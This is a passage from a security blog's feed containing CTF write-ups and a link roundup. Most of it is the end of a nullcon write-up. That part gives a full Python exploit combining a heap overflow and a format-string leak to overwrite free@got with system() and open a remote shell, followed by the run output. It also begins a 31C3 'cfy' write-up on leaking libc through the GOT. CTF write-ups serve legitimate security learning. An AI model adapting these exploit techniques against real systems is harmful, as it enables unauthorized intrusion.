</span><span class='line'>libc-2.16-0ubuntu6.so
</span><span class='line'>
</span><span class='line'>0047b50: 83c0 <span class="m">0175</span> a8e9 97bf ffff 81e1 ff00 <span class="m">0000</span>  ...u............
</span><span class='line'>005ad90: <span class="m">0083</span> c001 75b9 e95b ccff ff8b 4d10 8b45  ....u..<span class="o">[</span>....M..E
</span><span class='line'>0066ab0: 7cb4 <span class="m">0000</span> 83c0 <span class="m">0175</span> 918d b426 <span class="m">0000</span> <span class="m">0000</span>  <span class="p">|</span>......u...<span class="p">&amp;</span>....
</span><span class='line'>
</span><span class='line'>libc-2.19-0ubuntu6.4.so
</span><span class='line'>
</span><span class='line'>00471c0: <span class="m">0489</span> <span class="m">3424</span> e817 9e02 <span class="m">0083</span> c001 758a e9d1  ..4<span class="nv">$.</span>.......u...
</span><span class='line'>0047920: 24e8 ba96 <span class="m">0200</span> 83c0 <span class="m">0175</span> c5e9 74c2 ffff  <span class="nv">$.</span>.......u..t...
</span><span class='line'>005a850: <span class="m">8904</span> 24e8 d801 <span class="m">0100</span> 83c0 <span class="m">0175</span> b8e9 04cc  ..<span class="nv">$.</span>.......u....
</span><span class='line'>005b3a0: 83c0 <span class="m">0175</span> c9e9 bcc0 ffff a810 8d74 <span class="m">2600</span>  ...u.........t<span class="p">&amp;</span>.
</span><span class='line'>0066020: bcaf <span class="m">0000</span> 83c0 <span class="m">0175</span> 988d b426 <span class="m">0000</span> <span class="m">0000</span>  .......u...<span class="p">&amp;</span>....
</span><span class='line'>
</span><span class='line'>libc-2.19-13ubuntu3.so
</span><span class='line'>
</span><span class='line'>00472a0: <span class="m">0489</span> <span class="m">3424</span> e877 9c02 <span class="m">0083</span> c001 758a e9d1  ..4<span class="nv">$.</span>w......u...
</span><span class='line'>0047a00: <span class="m">0000</span> <span class="m">8934</span> 24e8 <span class="m">1695</span> <span class="m">0200</span> 83c0 <span class="m">0175</span> c5e9  ...4<span class="nv">$.</span>.......u..
</span><span class='line'>0050e40: <span class="m">8904</span> 24e8 <span class="m">6879</span> <span class="m">0100</span> 83c0 <span class="m">0175</span> b8e9 04cc  ..<span class="nv">$.</span>hy.....u....
</span><span class='line'>0051990: 83c0 <span class="m">0175</span> c9e9 bcc0 ffff a810 8d74 <span class="m">2600</span>  ...u.........t<span class="p">&amp;</span>.
</span><span class='line'>0066100: 1cae <span class="m">0000</span> 83c0 <span class="m">0175</span> 988d b426 <span class="m">0000</span> <span class="m">0000</span>  .......u...<span class="p">&amp;</span>....
</span></code></pre></td></tr></table></div></figure>


<p>I struck gold with libc-2.19-0ubuntu6.4.so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0066020: bcaf <span class="m">0000</span> 83c0 <span class="m">0175</span> 988d b426 <span class="m">0000</span> <span class="m">0000</span>  .......u...<span class="p">&amp;</span>....
</span></code></pre></td></tr></table></div></figure>


<p>Those bytes (0x7501c083) where at an offset of <code>xxxx6024</code> in the binary, which looked very much like the third address on the stack dumped from the remote binary. This had to be the right libc version! I loaded up the binary on my Ubuntu VM with libc-2.19-0ubuntu6.4.so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">LD_PRELOAD</span><span class="o">=</span>./libc-2.19-0ubuntu6.14.so ./mixme
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>and attached <code>gdb</code> to dump the address of <code>system()</code>. Using the aforementioned value from the stack, I calculated the offset to <code>system()</code>. I quickly modified my script to include this, overwriting <code>free@got</code> with <code>system()</code>. When I now made a note with the value <code>/bin/sh</code> and asked the binary to <code>get</code> that note, it wants to <code>free()</code> it. However, <code>free@got</code> is replaced with system(), effectively making the binary call <code>system('/bin/sh');</code>!</p>

<p>So, in true dirty-ctf-style, the following python script was written after hours of frantic tracing with gdb and coding in python.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># function to send commands to the binary</span>
</span><span class='line'><span class="k">def</span> <span class="nf">z</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect to remote host</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.163.248.69&#39;</span><span class="p">,</span> <span class="mi">9005</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive banner</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ask the binary to store three notes</span>
</span><span class='line'><span class="c"># we&#39;ll overflow a into b later on</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;a&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;AAAA&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;b&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;BBBB&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the third note will hold our format string</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;c&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">format_str</span> <span class="o">=</span> <span class="s">&quot;--%3$x&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">format_str</span><span class="p">)))</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">format_str</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># edit a with a large value</span>
</span><span class='line'><span class="c"># this overflows and overwrites the note_info struct of b</span>
</span><span class='line'><span class="c"># the pointer to the data is overwriting with free@got</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] overflowing a to set b to free@got&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;40&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x29\x00\x00\x00\x62\x00\x00\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">))</span>
</span><span class='line'><span class="c">#       ^ overflow    ^ restore 0x29, &#39;b&#39;               ^ size of b ^ free@got</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overwrite free@got with printf</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] replacing free() with printf()&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;b&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080485f0</span><span class="p">))</span>  <span class="c"># free@got overwritten with printf</span>
</span><span class='line'>
</span><span class='line'><span class="c"># now &#39;get&#39; c and trigger the format string vulnerability</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] triggering format string&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;get&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;c&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">format_str</span><span class="p">)))</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this proved to be a bit finicky:</span>
</span><span class='line'><span class="n">data</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'><span class="c"># grab leaked libc address</span>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;x--(.*)cSel&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">m</span>
</span><span class='line'>  <span class="n">leak</span> <span class="o">=</span> <span class="s">&quot;0x&quot;</span><span class="o">+</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="n">leak_hex</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] found first addr: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_hex</span><span class="p">))</span>
</span><span class='line'>  <span class="n">system</span> <span class="o">=</span> <span class="n">leak_hex</span> <span class="o">-</span> <span class="mi">155428</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] system @ {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># repeat the same trick, but this time, overwrite free@got with system()</span>
</span><span class='line'><span class="c"># first note contains /bin/sh, used as argument for system()</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;7&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;t&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;TTTT&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;q&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;QQQQ&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] overflowing t to set q to free@got&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;t&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;40&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x29\x00\x00\x00\x71\x00\x00\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">))</span>
</span><span class='line'><span class="c">#     ^ overflow              ^ restore &#39;q&#39;           ^ size of q  ^ free@got</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] replacing free() with system()&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;q&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>     <span class="c"># free@got overwritten with system</span>
</span><span class='line'>
</span><span class='line'><span class="c"># trigger system(&#39;/bin/sh&#39;)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;get&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;sh&#39;</span><span class="p">)</span>  <span class="c"># this note contains &#39;/bin/sh&#39; and those contents are passed to system()</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;7&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># shell spawned, interact with it!</span>
</span><span class='line'><span class="n">t</span><span class="o">=</span><span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span><span class="o">=</span><span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran it, and to my surprise, I got it right the first time! I dropped into a shell on the remote box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@ubuntu-VirtualBox:/home/ubuntu/nullcon/exp500# python exploit.py
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> overflowing a to <span class="nb">set </span>b to free@got
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> replacing free<span class="o">()</span> with <span class="nb">printf</span><span class="o">()</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> triggering format string
</span><span class='line'>Name: Size: --%3<span class="nv">$x</span>--b768d024cSelect op <span class="o">(</span>store/get/edit/exit<span class="o">)</span>:
</span><span class='line'><span class="o">[</span><span class="s1">&#39;b768d024&#39;</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> found first addr: 0xb768d024L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> system @ 0xb7667100L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> overflowing t to <span class="nb">set </span>q to free@got
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> replacing free<span class="o">()</span> with system<span class="o">()</span>
</span><span class='line'>/bin/sh
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span><span class="m">1005</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1005</span> <span class="nv">groups</span><span class="o">=</span>0
</span><span class='line'>cat flag.txt
</span><span class='line'>aw3s0m3++_hipp1e_pwn_r0ckst4r
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>aw3s0m3++_hipp1e_pwn_r0ckst4r</code>. This one was really though and I&rsquo;m glad I managed to beat it with just 20 minutes on the clock!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Weekly Roundup 2015 #1]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/03/weekly-roundup-2015-number-1/"/>
    <updated>2015-01-03T08:54:42+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/03/weekly-roundup-2015-number-1</id>
    <content type="html"><![CDATA[<p>Time for another weekly round-up of interesting links!</p>

<!-- more -->


<p>I&rsquo;ll kick this one off with a very interesting blog about <a href="http://v0ids3curity.blogspot.in/2014/12/return-to-vdso-using-elf-auxiliary.html">bypassing ASLR on 64 bit systems using ELF auxilliary vectors</a> by Reno Robert. This technique leaks the address of the VDSO (Virtual Dynamic Shared Object). The VDSO can then be used as a source for ROP gadgets. The entire process of writing a functioning exploit is described in great detail, with a proof-of-concept in <code>python</code>. Furthermore, the author notes that the address of VDSO is not very random, making bruteforcing an option even on 64 bit systems. Very nice read, very detailed!</p>

<p>I&rsquo;d like to follow up this exploitation goodness with a link to Google&rsquo;s Project Zero blog: <a href="http://googleprojectzero.blogspot.nl/2015/01/finding-and-exploiting-ntpd.html">Finding and exploiting ntpd vulnerabilities</a> by Stephen Röttger. This is a really in-depth story about fuzzing the NTPD daemon, coming up with something that barely looks like a vulnerability and through pure persistence, turning it into a full exploit. Amazing stuff!</p>

<p>If you like wargames, this one is sure to get your blood pumping: <a href="https://overthewire.org/wargames/drifter/">Drifter over at Overthewire</a> is online! It&rsquo;s a wargame along the lines of <a href="http://overthewire.org/wargames/vortex/">Vortex</a>, which I&rsquo;ve started playing this week. If you want to learn about binary exploitation, <a href="https://overthewire.org/">overthewire</a> is <strong>the</strong> place to start!</p>

<p>The folks over at rapid7 have now officially said <a href="https://community.rapid7.com/community/metasploit/blog/2014/12/08/good-bye-msfpayload-and-msfencode">farewell to msfpayload &amp; msfencode</a>. These awesome tools are being superseded by <code>msfvenom</code>. This blog post gives a basic rundown of the new tool and five good examples of it&rsquo;s usage. Further documentation about <code>msfvenom</code> can be found on <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">rapid7&rsquo;s github</a>.</p>

<p>Some things to look forward to in the land of VulnHub VMs: <a href="https://r3v3rs3r.wordpress.com">c0ne</a> is currently making a VM focused on binary exploitation. I can say from first hand that these binaries are really fun to exploit! Furthermore, strata&rsquo;s VM is being beta-tested and is due soon.</p>

<p>Finally, <a href="http://blog.vulnhub.com/2014/01/vulnhub-turns-0x01.html">VulnHub&rsquo;s birthday</a> is coming up. A little mouse told me there might just be a new competition coming&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[31C3 CTF - Cfy]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy/"/>
    <updated>2014-12-29T12:06:07+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy</id>
    <content type="html"><![CDATA[<p>Man, 31C3 CTF was tough. I managed to get this flag, worth 10 points. Seems I need to keep learning ;] Let&rsquo;s have a look at <code>cfy</code>.</p>

<!-- more -->


<p></p>

<p>We&rsquo;re given the binary and a place to connect to. Upon connecting with <code>nc</code>, we see the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3<span class="nv">$ </span>nc 188.40.18.73 3313
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span></code></pre></td></tr></table></div></figure>


<p>With option 2, we have an arbitrary read ability, but we have to pass in the pointer in raw hex. This allows us to leak a <code>libc</code> address from the GOT. I chose to leak <code>printf</code> because I figured that one would have been resolved by the time our input was handled.</p>

<p>Finding the address of <code>printf</code> pointer in GOT was done like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>objdump -d -M intel ./cfy <span class="p">|</span>grep <span class="s2">&quot;printf&quot;</span> -A2
</span><span class='line'>00000000004005e0 &lt;<span class="nb">printf</span>@plt&gt;:
</span><span class='line'>  4005e0: ff <span class="m">25</span> 3a 0a <span class="m">20</span> <span class="m">00</span>      jmp    QWORD PTR <span class="o">[</span>rip+0x200a3a<span class="o">]</span>        <span class="c"># 601020 &lt;_GLOBAL_OFFSET_TABLE_+0x20&gt;</span>
